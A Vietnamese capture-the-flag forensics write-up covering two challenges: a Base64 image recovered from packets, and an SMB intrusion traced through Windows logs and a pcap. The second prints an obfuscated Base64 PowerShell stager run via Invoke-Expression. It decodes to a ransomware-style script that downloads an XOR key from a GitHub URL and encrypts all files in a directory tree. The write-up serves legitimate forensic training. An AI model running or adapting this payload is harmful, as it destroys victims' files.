# ehctf-2025

## Forensic

### A in Q

Author: Sp4c3K

Description: Là một nhà phân tích bảo mật, kĩ năng phân tích gói tin liệu có quan trọng??

Flag Format: EHCTF{...}

#### Làm bài

Mình tải file mở file Wireshark lên đọc các packet trong **TCP protocol** thì mình thấy được đoạn mã **Base64** sau:

```
iVBORw0KGgoAAAANSUhEUgAAAKUAAAClCAAAAAAYQGIGAAABbElEQVR42u3bwbKCMBAEQP7/p9+7WxhnA0VlSeeEgrE5rIRZPP46jIOSkpKSkpKSkpKSkvJe5fF7fBz8sXX2sj4zJWVX5feCG377+OD6zJSUXZVn9Xe2Nyj50syUlPsoz6j1z1JS7qgcXyspKXdUpucwJgQOSso3KYMEYnLr4QSGkvJJZRx3/55/gfSfkvLxfs+4Jr8uKINfhbSyKSm7KtNEPL7DupC6U1I2VE6mgOMJ6tdZSspeynGPKWjiprnhTT1dSsrFlGnoMc4Dg72XVsGUlGsr6wF5yr+zxikp11EGi8zJkg8up5SUrZVBDJE+Ih48pkdJ+SZlvZ6vtIcpKfsrSz3dyUw+fY+Sspey9NRP6VZusrtLSdlLGVR28HR4cGN25yqYknId5eT/KCaXlpSUmynTJegRDkrKfZSlXm0QrlNSvkR5T6Jx5RwoKRsq62F4WsDpUpWSsqFyuUFJSUlJSUlJSUlJSTk//gEGUEO/WqFCOAAAAABJRU5ErkJggg==
```

**Kết quả**:
```
EHCTF{D4t4_G47h3r1ng}
```

---

### Holahela
- **Author**: Sp4c3K
- **Mô tả**: Tôi sử dụng chức năng share file và chạy ra ngoài một lúc. Lúc tôi về một số file tài liệu quan trọng của tôi đã bị mã hóa, không có chúng tôi sẽ bị đuổi việc mất. Cứu được ca này không ạ? =(((

- **Password file challenge**: EHCTF2025

- **Flag Format**: EHCTF{...}

**Phân tích:**

Trong bài có nhắc đến `share file` nên tôi đã thử search về các giao thức truyền file trên windows.Và tìm thấy một giao thức SMB (Server Message Block), tìm hiểu thì nó hoạt động theo kiểu **client-server**. SMB thường sử dụng giao thức **TCP/IP** qua cổng **445**.
Trong hệ điều hành Windows, các sự kiện liên quan đến giao thức **SMB** được ghi lại trong **Event Viewer** với các **Event ID** cụ thể. Logon types của **SMB** thường liên quan đến **Logon Type 3**.

**Cách làm bài:**

Mình export log **Security** của **evidence** về và đọc thử các **logon** của nó và thấy một event khá là bất thường.
```
EventData 

  SubjectUserSid S-1-0-0 
  SubjectUserName - 
  SubjectDomainName - 
  SubjectLogonId 0x0 
  TargetUserSid S-1-5-21-2651792428-3009230939-1008671347-1001 
  TargetUserName PandoraBox 
  TargetDomainName PANDORABOX 
  TargetLogonId 0x4a52b9 
  LogonType 3 
  LogonProcessName NtLmSsp  
  AuthenticationPackageName NTLM 
  WorkstationName KALI 
  LogonGuid {00000000-0000-0000-0000-000000000000} 
  TransmittedServices - 
  LmPackageName NTLM V2 
  KeyLength 128 
  ProcessId 0x0 
  ProcessName - 
  IpAddress 192.168.110.76 
  IpPort 36968 
  ImpersonationLevel %%1833 
  RestrictedAdminMode - 
```

Một Ip là `192.168.110.76 ` với port khá lớn là `36968` được đăng nhập từ `Kali`

Quay lại FTK Imager check qua các folder thì ở `Desktop` mình tìm thấy một file là `holahela.ps1` đây là một file **PowerShell Script**. Check  thử các event log của PowerShell thì nó chỉ có mỗi việc đã chạy file ps1 vào ngày 28/01/2025. `powershell -c .\holahela.ps1`.

Tiếp mình đã xem thử lịch sử các lệnh powershell được sử dụng. Ở đây mình tìm thấy dòng lệnh sau:
```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Sp4c3K/holahela/main/holahela.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
```
Đã tìm thấy github của Author check qua repositories `holahela` mình thấy một file là `key` có `6 commit` và trong số commit đấy mình tìm thấy phần đầu của `flag`
```
EHCTF{N3tw0rk_
```

Tiếp tục quay trờ lại FTK imager đến folder Documents thì thấy khá nhiều file `pcap`. Mình quyết định đọc file `28012025.pcapng` vì đây file tên ngày mà `holahela.ps1` được chạy.

Lọc qua các protocol **SMB** và đọc qua packets thì mình tìm được đoạn mã sau:

```
$Base64String = "KCgnZnVuY3Rpb24nKycgWCcrJ29yJysnLUYnKydpJysnbGUgewogICAgcGFyYW0gKCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICcrJyAgICAgIFtzdHInKydpbmddZWMnKydPJysnRmknKydsZVBhdGgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAonKycgJysnICcrJyAgICAgICcrJ1tzJysndHJpJysnbmddZWNPS2V5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAonKycgICAgKScrJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogJysnICAgZWNPRmlsZURhJysndGEgPSBbU3lzdGVtLklPLkZpbCcrJ2VdOjonKydSZWFkQWxsQnknKyd0ZXMoZScrJ2NPRmlsZVBhdGgnKycpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBlY08nKydLZXlCeXRlcyA9IFtTeScrJ3MnKyd0ZW0uVCcrJ2UnKyd4dC5FbmNvZGluZycrJ106OlVUJysnRjguR2V0Qnl0JysnZXMnKycoZWNPS2V5KSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIGVjT0tleScrJ0xlbmd0JysnaCA9IGVjT0tlJysneUJ5dGVzJysnLkxlbmd0aCAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAnKycgICcrJ2VjJysnT1hvclJlJysnc3VsdCA9IE5lJysndy1PYmplJysnY3QgJysnYnknKyd0ZVsnKyddIGVjT0ZpbGVEJysnYXRhLkxlbmd0aCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAonKycgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAonKycgICAgJysnZm9yIChlY09pICcrJz0gMDsgZWNPaSAtbHQgJysnZScrJ2NPRmknKydsZURhdGEuTCcrJ2VuZ3QnKydoOyBlYycrJ08nKydpJysnKyspICcrJ3sgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgJysnICAgZWNPWG9yUmVzdScrJ2x0W2VjT2ldID0nKycgZWNPRmlsZUQnKydhJysndGFbZWNPaV0gLWJ4b3InKycgJysnZWNPJysnS2UnKyd5Qnl0JysnZScrJ3NbJysnZScrJ2NPaSAlIGVjTycrJ0tleUxlbmcnKyd0aCcrJ10gICAgICAgICAgICAgICAgICAgICAKJysnIH0nKycgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAnKycgICcrJ1tTeXN0ZW0nKycuSU8nKycuRicrJ2lsZV0nKyc6JysnOicrJ1dyaXRlQWxsQnl0ZXMoZScrJ2NPRicrJ2lsZVBhdGgsICcrJ2VjJysnT1gnKydvclJlcycrJ3VsdCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAp9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAplY09rZScrJ3lVcicrJ2wnKycgPSBhanRodHRwczovL3JhJysndy5naXRodWJ1Jysnc2VyY29udGVudC4nKydjb20vU3A0JysnYzNLJysnLycrJ2hvbGFoZWxhL21haW4va2UnKyd5YWp0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCmVjTycrJ2tleSA9ICcrJ0ludm8nKydrJysnZS1XZWJSZXF1ZXN0IC0nKydVcicrJ2kgZScrJ2NPa2V5VXJsJysnIC1Vc2VCYXNpJysnY1BhcnNpbmcgOFVlIFNlbCcrJ2UnKydjdC1PYmplY3QnKycgJysnLUV4cGFuZFByJysnb3BlcnR5IENvJysnbicrJ3RlbnQgICAgICAKJysnZScrJ2MnKydPJysna2UnKyd5ICcrJz0gZWNPa2V5LlRyaW0nKycoKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKZWNPY3VyJysncmVudERpciA9IEcnKydldCcrJy1Mb2MnKydhdGlvbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKR2V0LScrJ0NoaWxkSScrJ3RlbSAtUGF0aCBlJysnY09jdXJyZW50RGlyICcrJy1SZWN1cnMnKydlIC1GaScrJ2xlIDhVZSBGb3JFYWNoLU9iamVjdCAnKyd7JysnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgWG9yLUZpbGUgLUZpbGVQYXRoIGVjT18uRnVsbE5hJysnbWUgLScrJ0tlJysneSBlJysnY09rZXkgICAgICAgICAgICAgICAgIAonKyd9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAonKS1DckVwbEFjZSc4VWUnLFtjSGFyXTEyNCAgLUNyRXBsQWNlJ2VjTycsW2NIYXJdMzYgLUNyRXBsQWNlICAoW2NIYXJdOTcrW2NIYXJdMTA2K1tjSGFyXTExNiksW2NIYXJdMzQpfCAmICggJFNIZWxsaURbMV0rJFNoZWxMaURbMTNdKydYJyk="
$DecodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64String))
Invoke-Expression $DecodedCommand
```

Đây là một đoạn PowerShell thực hiện giải mã một chuỗi Base64.

**Decrypt:**
- Quay trở lại FTK Imager lấy file `secret.txt` để giải mã nó ra.
- Tạo một folder chứa file nội dung của code giải mã `decrypt.ps1` và `secret.txt` và chạy file:
```powershell
powershell -c decrypt.ps
```
- Sau đó đọc file và thấy nữa sau của flag:
```
dump_fr0m_m3m}
```
**Kết quả:**
```
EHCTF{N3tw0rk_dump_fr0m_m3m}
```
